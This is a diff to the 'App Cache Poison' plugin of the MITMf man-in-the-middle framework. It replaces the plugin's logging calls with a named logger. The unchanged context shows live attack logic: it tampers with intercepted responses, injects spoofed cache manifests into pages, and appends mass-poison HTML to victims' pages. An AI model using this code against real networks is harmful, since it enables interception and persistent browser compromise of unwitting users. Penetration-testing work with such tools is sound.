@@ -30,6 +30,8 @@ from plugins.plugin import Plugin
 from datetime import date
 from core.sslstrip.URLMonitor import URLMonitor
 
+mitmf_logger = logging.getLogger('mitmf')
+
 class AppCachePlugin(Plugin):
     name       = "App Cache Poison"
     optname    = "appoison"
@@ -61,22 +63,22 @@ class AppCachePlugin(Plugin):
         if "enable_only_in_useragents" in self.config:
             regexp = self.config["enable_only_in_useragents"]
             if regexp and not re.search(regexp,req_headers["user-agent"]):
-                logging.info("%s Tampering disabled in this useragent (%s)" % (ip, req_headers["user-agent"]))
+                mitmf_logger.info("%s Tampering disabled in this useragent (%s)" % (ip, req_headers["user-agent"]))
                 return {'request': request, 'data': data}
                
         urls = self.urlMonitor.getRedirectionSet(url)
-        logging.debug("%s [AppCachePoison] Got redirection set: %s" % (ip, urls))
+        mitmf_logger.debug("%s [AppCachePoison] Got redirection set: %s" % (ip, urls))
         (name,s,element,url) = self.getSectionForUrls(urls)
 
         if s is False:
           data = self.tryMassPoison(url, data, headers, req_headers, ip)
           return {'request': request, 'data': data}
 
-        logging.info("%s Found URL %s in section %s" % (ip, url, name))
+        mitmf_logger.info("%s Found URL %s in section %s" % (ip, url, name))
         p = self.getTemplatePrefix(s)
 
         if element == 'tamper':
-          logging.info("%s Poisoning tamper URL with template %s" % (ip, p))
+          mitmf_logger.info("%s Poisoning tamper URL with template %s" % (ip, p))
           if os.path.exists(p + '.replace'): # replace whole content
             f = open(p + '.replace','r')
             data = self.decorate(f.read(), s)
@@ -93,12 +95,12 @@ class AppCachePlugin(Plugin):
           data = re.sub(re.compile("<html",re.IGNORECASE),"<html manifest=\"" + self.getManifestUrl(s)+"\"", data)
           
         elif element == "manifest":
-          logging.info("%s Poisoning manifest URL" % ip)
+          mitmf_logger.info("%s Poisoning manifest URL" % ip)
           data = self.getSpoofedManifest(url, s)
           headers.setRawHeaders("Content-Type", ["text/cache-manifest"])
 
         elif element == "raw": # raw resource to modify, it does not have to be html
-          logging.info("%s Poisoning raw URL" % ip)
+          mitmf_logger.info("%s Poisoning raw URL" % ip)
           if os.path.exists(p + '.replace'): # replace whole content
             f = open(p + '.replace','r')
             data = self.decorate(f.read(), s)
@@ -131,7 +133,7 @@ class AppCachePlugin(Plugin):
         if not re.search(self.config['mass_poison_url_match'], url): #different url
             return data
         
-        logging.debug("Adding AppCache mass poison for URL %s, id %s" % (url, browser_id))
+        mitmf_logger.debug("Adding AppCache mass poison for URL %s, id %s" % (url, browser_id))
         appendix = self.getMassPoisonHtml()
         data = re.sub(re.compile("</body>",re.IGNORECASE),appendix + "</body>", data)
         self.mass_poisoned_browsers.append(browser_id) # mark to avoid mass spoofing for this ip
